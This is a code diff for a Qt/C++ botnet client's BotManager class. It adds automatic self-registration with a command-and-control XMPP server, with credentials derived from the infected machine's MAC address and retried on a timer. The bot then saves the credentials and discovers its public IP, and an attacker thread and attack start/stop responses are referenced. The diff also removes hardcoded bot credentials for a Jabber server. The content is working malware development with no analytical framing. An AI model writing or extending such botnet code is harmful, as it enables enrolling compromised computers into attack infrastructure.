@@ -1,6 +1,7 @@
 #include "botmanager.h"
 #include "global.h"
 #include "xmppclient.h"
+#include "xmppregclient.h"
 #include "bot.h"
 #include "attacker.h"
 #include "storagemanager.h"
@@ -12,11 +13,12 @@
 #include "attackstartedresponse.h"
 #include "attackstoppedresponse.h"
 #include <QThread>
+#include <QTimer>
+#include <QNetworkInterface>
 #include <QNetworkAccessManager>
 #include <QNetworkRequest>
 #include <QNetworkReply>
 #include <QUrl>
-#include <QNetworkInterface>
 #include <QSysInfo>
 #include <QTime>
 #include <iostream>
@@ -42,6 +44,30 @@ void BotManager::disconnectFromCC()
     _xmppClient -> disconnectFromServer();
 
     writeEvent("Desconectado de CC");
+}
+
+void BotManager::registerOnCC()
+{
+    _xmppRegClient = new XmppRegClient(StorageManager::readConfig("server").toString());
+
+    connect(_xmppRegClient, SIGNAL(success(const QString&, const QString&, const QString&)),
+            this, SLOT(successOnXmppRegClient(const QString&, const QString&, const QString&)));
+    connect(_xmppRegClient, SIGNAL(failure(const QString&, const QString&, const QString&)),
+            this, SLOT(failureOnXmppRegClient(const QString&, const QString&, const QString&)));
+
+    QString username;
+    QString password;
+
+    foreach(QNetworkInterface iface, QNetworkInterface::allInterfaces())
+        if(!(iface.flags() & QNetworkInterface::IsLoopBack) &&
+           (iface.flags() & QNetworkInterface::IsUp) &&
+           (iface.flags() & QNetworkInterface::IsRunning)) {
+            QString mac = iface.hardwareAddress().remove(":");
+            username = mac.mid(0, 6);
+            password = mac.mid(6, 11);
+        }
+
+    _xmppRegClient -> sendRegistrationRequest(username, password);
 }
 
 void BotManager::readyOnXmppClient()
@@ -136,10 +162,29 @@ void BotManager::finishedOnNetworkAccessManager(QNetworkReply *reply)
     reply -> deleteLater();
 }
 
+void BotManager::successOnXmppRegClient(const QString& server, const QString &username, const QString &password)
+{
+    writeEvent(QString("Registro exitoso en %1 para Usuario: %2 y Password: %3").arg(server).arg(username).arg(password));
+
+    StorageManager::writeConfig("jid", QString("%1@%2").arg(username).arg(server));
+    StorageManager::writeConfig("password", password);
+
+    sendHttpGetRequestToDiscoverIp();
+}
+
+void BotManager::failureOnXmppRegClient(const QString& server, const QString& username, const QString& password)
+{
+    writeEvent(QString("Registro fallido en %1 para Usuario: %2 y Password: %3 (Proximo intento en %4 minutos)").arg(server).arg(username).arg(password).arg(MINUTES_OF_WAITING));
+
+    QTimer::singleShot(MINUTES_OF_WAITING * 60 * 1000, this, SLOT(registerOnCC()));
+}
+
 BotManager::BotManager()
 {
     _xmppClient = new XmppClient(APPLICATION_NAME);
     _xmppClient -> setParent(this);
+
+    _xmppRegClient = 0;
 
     _bot = new Bot;
 
@@ -167,6 +212,9 @@ BotManager::~BotManager()
 
     delete _attackerThread;
 
+    if(_xmppRegClient)
+        delete _xmppRegClient;
+
     delete _xmppClient;
     delete _bot;
 }
@@ -187,10 +235,8 @@ void BotManager::createConnections()
 
 void BotManager::setupConfig()
 {
-    if(!StorageManager::existsConfig() && StorageManager::createConfig()) {
-        StorageManager::writeConfig("jid", "bot1@jabber.odyssey.net");
-        StorageManager::writeConfig("password", "1234");
-    }
+    if(!StorageManager::existsConfig())
+        StorageManager::createConfig();
 }
 
 void BotManager::setupBot(const QString& pubIp)
@@ -213,7 +259,10 @@ void BotManager::setupBot(const QString& pubIp)
     _bot -> setOs(os);
     _bot -> setState(WaitingForCC);
 
-    emit ready();
+    if(!id.isEmpty())
+        emit ready();
+    else
+        emit unregistered();
 }
 
 void BotManager::sendHttpGetRequestToDiscoverIp()
